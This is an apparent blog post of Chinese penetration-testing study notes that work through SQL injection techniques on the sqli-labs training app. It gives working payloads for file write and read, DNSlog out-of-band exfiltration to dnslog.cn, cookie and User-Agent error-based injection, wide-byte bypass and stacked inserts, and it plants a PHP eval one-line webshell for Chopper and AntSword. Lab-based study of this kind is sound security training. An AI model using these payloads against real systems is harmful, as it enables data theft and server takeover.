{"title":"渗透测试笔记 - day13 其他注入技巧","date":"2023-03-16T17:42:18.098Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day13 其他注入技巧","updated":"2023-03-17T04:58:20.153Z","content":"<h2 id=\"sql导出到文件：\">sql导出到文件：<a title=\"#sql导出到文件：\" href=\"#sql导出到文件：\"></a></h2>\n<h3 id=\"outfile\">outfile<a title=\"#outfile\" href=\"#outfile\"></a></h3>\n<p>select * into outfile ‘Path’</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924401.png\" alt=\"image-20220211093209512\" loading=\"lazy\" class=\"φbp\"></p>\n<p>权限不够。</p>\n<h3 id=\"更改my.ini升级权限\">更改my.ini升级权限<a title=\"#更改my.ini升级权限\" href=\"#更改my.ini升级权限\"></a></h3>\n<p>查看安全配置信息</p>\n<p>show global variables like ‘%secure_file_priv%’;</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924975.png\" alt=\"image-20220211093433850\" loading=\"lazy\" class=\"φbp\"></p>\n<p>打开mysql根目录下的my.ini文件，添加secure_file_priv=''语句。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924619.png\" alt=\"image-20220211093915375\" loading=\"lazy\" class=\"φbp\"></p>\n<p>重启数据库服务。</p>\n<p>执行outfile。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924747.png\" alt=\"image-20220211094014548\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924117.png\" alt=\"image-20220211094112732\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h3 id=\"dumpfile\">dumpfile<a title=\"#dumpfile\" href=\"#dumpfile\"></a></h3>\n<p>select * into dumpfile ‘Path’;</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924963.png\" alt=\"image-20220211094221786\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924370.png\" alt=\"image-20220211094233471\" loading=\"lazy\" class=\"φbp\"></p>\n<p>load_file</p>\n<p>select load_file(‘Path’);</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924028.png\" alt=\"image-20220211094349143\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"dnslog.cn\"><a href=\"http://dnslog.cn\">dnslog.cn</a><a title=\"#dnslog.cn\" href=\"#dnslog.cn\"></a></h2>\n<p>使用DNSlog返回数据库信息</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924098.png\" alt=\"image-20220211111029560\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用concat拼接访问生成域名</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924152.png\" alt=\"image-20220211111101334\" loading=\"lazy\" class=\"φbp\"></p>\n<p>返回成功。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924559.png\" alt=\"image-20220211210611497\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用16进制编码绕过字符拼接。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924399.png\" alt=\"image-20220211111905122\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924258.png\" alt=\"image-20220211210556576\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"练习：sqli-lab-less-1\">练习：sqli-lab less-1<a title=\"#练习：sqli-lab-less-1\" href=\"#练习：sqli-lab-less-1\"></a></h3>\n<p>dnslog注数据库名</p>\n<p>payload：?id=1’ union select 1,2,load_file(concat(‘\\\\’,database(),‘.’,‘<a href=\"http://cehjq6.dnslog.cn\">cehjq6.dnslog.cn</a>’,‘\\1’))-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925325.png\" alt=\"image-20220211210506470\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925157.png\" alt=\"image-20220211210540885\" loading=\"lazy\" class=\"φbp\"></p>\n<p>注表名。</p>\n<p>payload：?id=1’ union select 1,2,load_file(concat(‘\\\\’,(select table_name from information_schema.tables where table_schema=‘security’ limit 1,1),‘.’,‘<a href=\"http://cehjq6.dnslog.cn\">cehjq6.dnslog.cn</a>’,‘\\1’))-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925821.png\" alt=\"image-20220211212622512\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925653.png\" alt=\"image-20220211212639974\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925697.png\" alt=\"image-20220211212650519\" loading=\"lazy\" class=\"φbp\"></p>\n<p>外带数据。</p>\n<p>payload：?id=1’ union select 1,2,load_file(concat(‘\\\\’,(select username from security.users limit 3,1),‘.’,‘<a href=\"http://hkss30.dnslog.cn\">hkss30.dnslog.cn</a>’,‘\\1’))-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925564.png\" alt=\"image-20220211212710550\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"cookie注入\">cookie注入<a title=\"#cookie注入\" href=\"#cookie注入\"></a></h2>\n<p>服务器从cookie中读取数据时，可以使用cookie注入数据从而绕过post和get检测。</p>\n<h3 id=\"练习：sqli-lab-less-20\">练习：sqli-lab less-20<a title=\"#练习：sqli-lab-less-20\" href=\"#练习：sqli-lab-less-20\"></a></h3>\n<p>输入用户名密码抓包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925494.png\" alt=\"image-20220211215812501\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆数据库</p>\n<p>payload：Cookie: uname=admin’ and updatexml(1,concat(‘||’,(select database()),‘||’),1)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925276.png\" alt=\"image-20220211220300851\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆security表名</p>\n<p>payload：Cookie: uname=admin’ and updatexml(1,concat(‘||’,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’),‘||’),1)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925371.png\" alt=\"image-20220211220611293\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆数据：</p>\n<p>payload：Cookie: uname=admin’ and updatexml(1,concat(‘||’,(select username from security.users limit 3,1),‘||’),1)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925150.png\" alt=\"image-20220211220715488\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"ua注入（useragent）\">UA注入（UserAgent）<a title=\"#ua注入（useragent）\" href=\"#ua注入（useragent）\"></a></h2>\n<p>服务器未对user-agent严格检测时，可通过ua注入命令。</p>\n<h3 id=\"练习：sqli-lab-less-18\">练习：sqli-lab less-18<a title=\"#练习：sqli-lab-less-18\" href=\"#练习：sqli-lab-less-18\"></a></h3>\n<p>抓包获取请求头。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925768.png\" alt=\"image-20220211221201039\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆数据库：</p>\n<p>payload：User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0’ and extractvalue(1,concat(0x7e,(select database()),0x7e))||’</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925625.png\" alt=\"image-20220211221944518\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆表名：</p>\n<p>payload：User-Agent:-1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925523.png\" alt=\"image-20220211222248995\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆数据：</p>\n<p>payload：User-Agent:-1’ and extractvalue(1,concat(0x7e,(select username from security.users limit 3,1),0x7e))||’</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925595.png\" alt=\"image-20220211222436211\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"宽字节注入：\">宽字节注入：<a title=\"#宽字节注入：\" href=\"#宽字节注入：\"></a></h2>\n<p>0xd5和0xdf和‘转义符’\\'可以在GBK编码的情况下构成汉字，因此可以使用0xdf和0xd5绕过转义。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925742.png\" alt=\"image-20220211150112595\" loading=\"lazy\" class=\"φbp\"></p>\n<p>练习：sqli-lab less-33</p>\n<p>爆库名</p>\n<p>payload：?id=-1%df’ union select 1,2,database()-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925481.png\" alt=\"image-20220211230424114\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆表名</p>\n<p>payload：?id=-1%df’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925848.png\" alt=\"image-20220211232717740\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆数据</p>\n<p>payload：?id=-1%df’ union select 1,2,(select username from security.users limit 3,1 )-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925906.png\" alt=\"image-20220211232431238\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"堆叠注入：\">堆叠注入：<a title=\"#堆叠注入：\" href=\"#堆叠注入：\"></a></h2>\n<p>通过分号分隔sql语句达到注入式执行多条命令的目的。</p>\n<p>payload：?id=1’;insert into users(id,username,password) values (‘15’,‘admin’,‘123456’)– -</p>\n<h3 id=\"练习：sqli-lab-less-1-1\">练习：sqli-lab less-1<a title=\"#练习：sqli-lab-less-1-1\" href=\"#练习：sqli-lab-less-1-1\"></a></h3>\n<p>注入数据</p>\n<p>payload：?id=1’;insert into security.users (id,username,password) values (‘100’,‘wlq’,‘123123’)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925468.png\" alt=\"image-20220211214456545\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925930.png\" alt=\"image-20220211214528125\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"一句话木马\">一句话木马<a title=\"#一句话木马\" href=\"#一句话木马\"></a></h2>\n<p>如payload：?id=1’ union select 1,&quot;<?php eval($_POST['cmd']);?>, 3 into outfile “Path”– -</p>\n<p>注入木马：</p>\n<p>payload：?id=1’ union select 1,&quot;<?php eval($_POST['cmd']);?>, 3 into outfile “O:\\program files\\phpstudy\\phpstudy_pro\\www\\sqli\\OneWord.php”– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925233.png\" alt=\"image-20220211214721449\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925875.png\" alt=\"image-20220211215214142\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"webshell工具\">webshell工具<a title=\"#webshell工具\" href=\"#webshell工具\"></a></h3>\n<h4 id=\"菜刀\">菜刀<a title=\"#菜刀\" href=\"#菜刀\"></a></h4>\n<p>新建连接，输入地址和口令。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925738.png\" alt=\"image-20220211165519246\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"蚁剑\">蚁剑<a title=\"#蚁剑\" href=\"#蚁剑\"></a></h4>\n<p>新建连接，输入地址和口令。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925402.png\" alt=\"image-20220211165759017\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"\"><a title=\"#\" href=\"#\"></a></h2>\n<h2 id=\"作业：\">作业：<a title=\"#作业：\" href=\"#作业：\"></a></h2>\n<p>安装python3：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111925003.png\" alt=\"image-20220211233107546\" loading=\"lazy\" class=\"φbp\"></p>\n<p>给phpstudy安装好phpmyadmin</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926721.png\" alt=\"image-20220211234010804\" loading=\"lazy\" class=\"φbp\"></p>\n","prev":{"title":"渗透测试笔记 - day14 getshell和自动化注入","link":"2023/03/16/渗透测试笔记 - day14 getshell和自动化注入"},"next":{"title":"渗透测试笔记 - day16、17 HTML基础","link":"2023/03/16/渗透测试笔记 - day16、17 HTML基础"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day13 其他注入技巧/","toc":[{"id":"sql导出到文件：","title":"sql导出到文件：","index":"1","children":[{"id":"outfile","title":"outfile","index":"1.1"},{"id":"更改my.ini升级权限","title":"更改my.ini升级权限","index":"1.2"},{"id":"dumpfile","title":"dumpfile","index":"1.3"}]},{"id":"dnslog.cn","title":"dnslog.cn","index":"2","children":[{"id":"练习：sqli-lab-less-1","title":"练习：sqli-lab less-1","index":"2.1"}]},{"id":"cookie注入","title":"cookie注入","index":"3","children":[{"id":"练习：sqli-lab-less-20","title":"练习：sqli-lab less-20","index":"3.1"}]},{"id":"ua注入（useragent）","title":"UA注入（UserAgent）","index":"4","children":[{"id":"练习：sqli-lab-less-18","title":"练习：sqli-lab less-18","index":"4.1"}]},{"id":"宽字节注入：","title":"宽字节注入：","index":"5"},{"id":"堆叠注入：","title":"堆叠注入：","index":"6","children":[{"id":"练习：sqli-lab-less-1-1","title":"练习：sqli-lab less-1","index":"6.1"}]},{"id":"一句话木马","title":"一句话木马","index":"7","children":[{"id":"webshell工具","title":"webshell工具","index":"7.1"}]},{"id":"","title":"","index":"8"},{"id":"作业：","title":"作业：","index":"9"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day13 其他注入技巧/\" title=\"渗透测试笔记 - day13 其他注入技巧\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day13 其他注入技巧/</a>"},"reading_time":"1073 words in 7 min"}